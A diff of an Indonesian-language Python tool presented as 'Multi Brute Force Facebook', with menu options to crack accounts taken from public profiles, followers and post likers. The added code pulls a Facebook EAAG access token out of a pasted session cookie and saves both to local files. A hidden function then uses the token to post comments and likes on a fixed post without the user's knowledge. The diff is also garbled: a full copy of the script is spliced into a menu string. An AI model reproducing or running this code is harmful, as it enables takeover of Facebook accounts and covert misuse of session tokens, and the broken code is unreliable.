@@ -10,7 +10,7 @@ from rich.console import Console
 Dump = []
 ### BANNER OR LOGO ###
 def banner_logo():
-    os.system('cls' if os.name == 'nt' else 'clear') # Coded by BIN1745
+    os.system('cls' if os.name == 'nt' else 'clear') # Coded by AXOM959
     Console(width=50, style="bold hot_pink2").print(Panel("""[bold red]●[bold yello] ●[bold green] ●
 [bold red]    .-.  .-..----. .----.    .----..----.  
 [bold red]    }  \/  {| {_} }} |__}___ } |__}| {_} } 
@@ -92,7 +92,96 @@ def daftar_menu():
     Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
 [bold green]2[bold white]. Crack User Dari Pengikut
 [bold green]3[bold white]. Crack User Dari Like Postingan
-[bold green]4[bold white]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
+[bold green]4[bold white]#!/usr/bin/env python3
+import requests, time, os, re, json, random
+from rich.panel import Panel
+from rich import print
+from concurrent.futures import ThreadPoolExecutor
+from rich.tree import Tree
+from rich.console import Console
+
+### LIST DUMP ###
+Dump = []
+### BANNER OR LOGO ###
+def banner_logo():
+    os.system('cls' if os.name == 'nt' else 'clear') # Coded by AXOM959
+    Console(width=50, style="bold hot_pink2").print(Panel("""[bold red]●[bold yello] ●[bold green] ●
+[bold red]    .-.  .-..----. .----.    .----..----.  
+[bold red]    }  \/  {| {_} }} |__}___ } |__}| {_} } 
+[bold white]    | {  } || {_} }} '_}{___}} '_} | {_} } 
+[bold white]    `-'  `-'`----' `--'      `--'  `----'  
+[bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
+    return 0
+### DAPATKAN NAMA ###
+def dapatkan_nama(cookie, token_eaag):
+    with requests.Session() as r:
+        r.headers.update({
+            'host': 'graph.facebook.com',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
+            'cookie': cookie
+        })
+        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
+        if 'name' in str(response) and 'id' in str(response):
+            return response['name'].title(), response['id']
+        else:
+            Console(width=50, style="bold hot_pink2").print(Panel("[italic red]Gagal Akses Graph Facebook, Kemungkinan Cookies Facebook Sudah Kadaluarsa!", title="[bold hot_pink2]([bold blue]Token Invalid[bold hot_pink2])"));time.sleep(3.2);login_cookie()
+### LOGIN USING COOKIE ###
+def login_cookie():
+    try:
+        banner_logo()
+        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Login Menggunakan Cookie Facebook
+[bold green]2[bold white]. Cara Mendapatkan Cookie Facebook
+[bold green]3[bold white]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Login Using Cookie) [bold green]<[bold yellow]<[bold red]<"))
+        query = Console().input("[bold hot_pink2]   ╰─> ")
+        if query == '1' or query == '01':
+            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white], Gunakan Tumbal Untuk Login Dan Pastikan Tidak Terkena[italic yellow] Checkpoint[italic white]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
+            cookie = Console().input("[bold hot_pink2]   ╰─> ")
+            with requests.Session() as r:
+                r.headers.update({
+                    'cookie': cookie,
+                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
+                    'host': 'business.facebook.com'
+                })
+                response3 = r.get('https://business.facebook.com/business_locations').text
+                token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
+                name, id = dapatkan_nama(cookie, token_eaag)
+                Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
+[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
+                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
+        elif query == '2' or query == '02':
+            try:
+                Console().print("[bold hot_pink2]   ╰─>[bold green] Kamu Akan Diarahkan Ke Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/@noprian5242");exit()
+            except:exit()
+        elif query == '3' or query == '03':
+            Console().print("[bold hot_pink2]   ╰─>[bold yellow] Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
+        else:
+            Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
+    except Exception as e:
+        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
+### BOT KOMEN ###
+def bot_komen(cookie, token_eaag):
+    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
+        text = random.choice(
+            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
+        )
+        r.cookies.update({
+            'cookie': cookie
+        })
+        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
+        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
+        if "\"id\":\"" in str(response) and str(response2) == 'true':
+            return 0
+        else:
+            return 1
+### DAFTAR MENU ###
+def daftar_menu():
+    try:
+        banner_logo();cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
+        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
+        name, id = dapatkan_nama(cookie, token_eaag)
+        Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
+[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
+. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
     query = Console().input("[bold hot_pink2]   ╰─> ")
     if query == '1' or query == '01':
         try:
